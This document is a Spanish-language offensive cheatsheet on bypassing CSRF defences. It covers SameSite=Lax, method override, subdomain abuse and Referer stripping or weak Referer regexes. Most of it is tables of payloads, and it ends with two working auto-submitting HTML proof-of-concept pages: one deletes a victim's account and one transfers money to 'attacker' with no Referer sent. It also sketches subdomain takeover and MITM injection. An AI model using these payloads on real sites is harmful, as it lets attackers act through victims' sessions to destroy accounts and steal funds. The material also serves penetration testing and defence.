---
aliases:
  - SameSite Bypass
  - Referer Bypass
  - Cookie SameSite Lax
tags:
  - type/cheatsheet
  - vuln/csrf
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Cross-Site Request Forgery (CSRF)]]'
---
# CSRF - Bypass de SameSite y Referer

***

## SameSite=Lax GET-based

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | `SameSite=Lax` (default Chrome 80+) bloquea POST cross-site pero **permite GET top-level navigation**. Si endpoint state-changing acepta GET → CSRF aún funcional. | RFC 6265bis. |
| Force GET con state change | `<a href="https://target/api/delete?id=42">Click</a>` | User clic = top-level GET con cookie. |
| Auto-redirect GET | `<meta http-equiv="refresh" content="0;url=https://target/api/...">` | No requiere click. |
| Window.open | `window.open('https://target/api/...')` | Top-level nueva ventana. |
| Iframe top-level | `top.location='https://target/api/...'` | Forzar top navigation desde iframe. |
| HTTP→HTTPS redirect | Si target redirecciona, primer GET puede llevar cookie | Edge case. |
| Lax 2-min window | Chrome trata cookie como SameSite=None por **2 minutos después de set** | Window de explotación. |
| Cookie sin atributo SameSite | Browsers viejos default None | Vulnerable. |
| Detect Lax via probe | Mandar cross-site POST con cookie + ver si llega | Si NO llega = Lax. Si llega = None. |
| GET endpoint forced via routing | Backend acepta `/api/users/42/delete` → llamar como GET | Anti-pattern endpoints. |
| Method override en GET | `?_method=DELETE` con SameSite=Lax | Top-level GET → method override. |
| RESTful misconfig | Verbo no estandar usado en GET | Cualquier endpoint state-changing por GET. |
^csrf-bypass-samesite-lax

___

## Method Override

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Header X-HTTP-Method-Override | POST request con `X-HTTP-Method-Override: PUT` | Backend interpreta como PUT. |
| Header X-Method-Override | Variantes: `X-Method-Override`, `X-HTTP-Method`, `X-Override-Method` | Probar todos. |
| Body field _method | `<input name="_method" value="PUT">` | Rails / Symfony default. |
| Query string _method | `?_method=DELETE` | Igual concepto. |
| Convertir GET en POST/DELETE | Frontend POST + override → backend procesa como DELETE | Más allá de SameSite policy. |
| Bypass de WAF que filtra DELETE | WAF deja pasar POST → method override hace DELETE en backend | WAF blind a la conversión. |
| Bypass de SameSite=Lax | Form GET top-level + `_method=POST` adentro | Lax permite GET, backend trata como POST. |
| Combinaciones engine-specific | Spring acepta `X-HTTP-Method-Override`, Laravel `_method`, Rails ambos | Conocer stack target. |
| GraphQL + method override | GraphQL con override puede ejecutar mutations como GET | Edge case. |
^csrf-bypass-method-override

### Setup completo SameSite=Lax + method override

```html
<!-- Form top-level GET (permitido por Lax) que el backend convierte a DELETE -->
<form action="https://target.com/api/account" method="GET">
  <input name="_method" value="DELETE">
  <input name="confirm" value="yes">
</form>
<script>document.forms[0].submit()</script>
```

GET top-level con cookie → backend convierte a DELETE → cuenta borrada.

___

## Subdomain Abuse

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Cookies con `Domain=.target.com` enviadas a TODOS los subdomains. Atacante con XSS / control en `xyz.target.com` puede actuar como CSRF "same-site". | Same registrable domain = SameSite OK. |
| Target subdomain takeover | DNS subdomain CNAME a Heroku / S3 deleted | Toma control + envía requests con cookies. |
| Subdomain XSS | XSS en `blog.target.com` → fetch a `app.target.com` con cookies | Bypass de same-origin sin CORS. |
| Subdomain con HTTP solo | `http.target.com` HTTP no encrypted → MITM inject scripts | Downgrade attack. |
| Wildcard cert abuse | `*.target.com` cert robado / leaked | DNS hijack + cert. |
| Cookie sin Domain attribute | Solo válida para subdomain exacto | Más estricto pero algunos backends laxos. |
| `__Host-` cookie prefix | Cookie con prefix `__Host-` no acepta Domain attribute | Más segura — pero cookies legacy aún común. |
| `__Secure-` prefix | Mismo concepto pero solo HTTPS | Extra layer. |
| Subdomain con file upload | Upload XSS payload en `cdn.target.com` → ejecutado en context same-site | CDN abuse. |
| Subdomain dev / staging | `dev.target.com` accesible público con XSS | DevSecOps fail. |
^csrf-bypass-subdomain

___

## Referer Strip / Referrer-Policy

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Backend valida `Referer` header. Si manera de strip Referer → bypass de check. | Referer strip = anonimizar origen. |
| Meta referrer no-referrer | `<meta name="referrer" content="no-referrer">` | HTML5 hint — browser no manda Referer. |
| Referrer-Policy header | `Referrer-Policy: no-referrer` | Header HTTP — same effect. |
| Anchor rel=noreferrer | `<a href="..." rel="noreferrer">` | Per-link control. |
| HTTPS → HTTP downgrade | `<a href="http://target/...">` desde HTTPS attacker | Browsers strip Referer en downgrade. |
| Data URL | `<a href="data:text/html,<script>fetch('https://target/...')</script>">` | data: → no Referer cross-origin. |
| Blob URL | `URL.createObjectURL(blob)` + redirect | Sin Referer. |
| Window.open con noopener | `window.open(url, '_blank', 'noopener')` | No Referer en ciertos contextos. |
| Server check empty Referer | Backend rejecta si Referer ausente, pero acepta si hay valor — atacante manda fake | Different bypass. |
| Bypass Referer parse weak | Backend regex `^https://target.com` matchea `https://target.com.attacker.com` | Insufficient anchor. |
| Bypass via @ en URL | `https://target.com@attacker.com` | Userinfo en URL — browser parsea distinto. |
| Bypass via fragment | `https://attacker.com/#https://target.com` | Backend regex sobre Referer fragment. |
| Subdomain match vulnerable | Backend regex `target.com` matchea `evil-target.com` | No anchor. |
^csrf-bypass-referer

### PoC con meta referrer

```html
<!DOCTYPE html>
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form action="https://target.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
  </form>
  <script>document.forms[0].submit()</script>
</body>
</html>
```

Browser no envía `Referer` → backend valida ausencia y "no detecta CSRF" → action procede.

***
